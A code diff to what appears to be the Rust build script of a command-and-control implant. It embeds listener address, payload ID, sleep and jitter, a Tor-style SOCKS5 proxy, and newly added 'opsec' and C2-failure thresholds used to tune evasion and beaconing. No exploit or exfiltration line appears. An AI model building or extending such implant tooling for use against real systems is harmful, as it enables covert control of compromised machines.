@@ -18,6 +18,11 @@ fn main() {
     println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
     println!("cargo:rerun-if-env-changed=SOCKS5_HOST");
     println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
+    println!("cargo:rerun-if-env-changed=BASE_MAX_C2_FAILS");
+    println!("cargo:rerun-if-env-changed=C2_THRESH_INC_FACTOR");
+    println!("cargo:rerun-if-env-changed=C2_THRESH_DEC_FACTOR");
+    println!("cargo:rerun-if-env-changed=C2_THRESH_ADJ_INTERVAL");
+    println!("cargo:rerun-if-env-changed=C2_THRESH_MAX_MULT");
 
     // Get configuration from environment variables
     let server_host = env::var("LISTENER_HOST").unwrap_or_default();
@@ -50,6 +55,16 @@ fn main() {
     // Only use environment config if we have all required values
     let config_content = if !server_host.is_empty() && !server_port.is_empty() && !payload_id.is_empty() {
         log_build("Using environment variables for config");
+        let base_enter_thresh = env::var("THRESHOLD_ENTER").unwrap_or_else(|_| "50.0".to_string());
+        let base_exit_thresh = env::var("THRESHOLD_EXIT").unwrap_or_else(|_| "25.0".to_string());
+        let min_full_opsec = env::var("MIN_FULL_OPSEC_SECS").unwrap_or_else(|_| "300".to_string());
+        let min_bg_opsec = env::var("MIN_BG_OPSEC_SECS").unwrap_or_else(|_| "60".to_string());
+        let base_max_c2_fails = env::var("BASE_MAX_C2_FAILS").unwrap_or_else(|_| "5".to_string());
+        let min_reduced_opsec = env::var("MIN_REDUCED_OPSEC_SECS").unwrap_or_else(|_| "120".to_string());
+        let c2_inc_factor = env::var("C2_THRESH_INC_FACTOR").unwrap_or_else(|_| "1.0".to_string());
+        let c2_dec_factor = env::var("C2_THRESH_DEC_FACTOR").unwrap_or_else(|_| "1.0".to_string());
+        let c2_adj_interval = env::var("C2_THRESH_ADJ_INTERVAL").unwrap_or_else(|_| u64::MAX.to_string());
+        let c2_max_mult = env::var("C2_THRESH_MAX_MULT").unwrap_or_else(|_| "1.0".to_string());
         format!(
             r#"{{
                 "server_url": "{}:{}",
@@ -59,26 +74,55 @@ fn main() {
                 "protocol": "{}",
                 "socks5_enabled": {},
                 "socks5_host": "{}",
-                "socks5_port": {}
+                "socks5_port": {},
+                "base_threshold_enter_full_opsec": {},
+                "base_threshold_exit_full_opsec": {},
+                "min_duration_full_opsec_secs": {},
+                "min_duration_background_opsec_secs": {},
+                "base_max_consecutive_c2_failures": {},
+                "min_duration_reduced_activity_secs": {},
+                "c2_failure_threshold_increase_factor": {},
+                "c2_failure_threshold_decrease_factor": {},
+                "c2_threshold_adjust_interval_secs": {},
+                "c2_dynamic_threshold_max_multiplier": {}
             }}"#,
             server_host, server_port, sleep_interval, payload_id, protocol,
-            socks5_enabled, socks5_host, socks5_port
+            socks5_enabled, socks5_host, socks5_port,
+            base_enter_thresh, base_exit_thresh,
+            min_full_opsec, min_bg_opsec,
+            base_max_c2_fails,
+            min_reduced_opsec,
+            c2_inc_factor, c2_dec_factor, c2_adj_interval, c2_max_mult
         )
     } else if let Ok(content) = fs::read_to_string("config.json") {
         log_build("Using config.json file for config");
+        // We assume config.json contains the new fields if needed, 
+        // otherwise serde(default) in AgentConfig will handle it.
         content
     } else {
-        log_build("No valid config found, using empty config (will cause runtime error)");
+        log_build("No valid config found, using default embedded config");
+        // Update the hardcoded fallback JSON
         r#"{
-            "server_url": "",
+            "server_url": "", 
             "sleep_interval": 5,
             "jitter": 2,
             "payload_id": "",
             "protocol": "http",
             "socks5_enabled": true,
-            "socks5_host": 127.0.0.1,
-            "socks5_port": 9050
-        }"#.to_string()
+            "socks5_host": "127.0.0.1",
+            "socks5_port": 9050,
+            "base_threshold_enter_full_opsec": 50.0,
+            "base_threshold_exit_full_opsec": 25.0,
+            "min_duration_full_opsec_secs": 300,
+            "min_duration_background_opsec_secs": 60,
+            "base_max_consecutive_c2_failures": 5,
+            "min_duration_reduced_activity_secs": 120,
+            "c2_failure_threshold_increase_factor": 1.0,
+            "c2_failure_threshold_decrease_factor": 1.0,
+            "c2_threshold_adjust_interval_secs": {},
+            "c2_dynamic_threshold_max_multiplier": 1.0
+        }"#.replace("{}", &u64::MAX.to_string())
+           .to_string()
     };
 
     // Generate Rust code with the embedded config
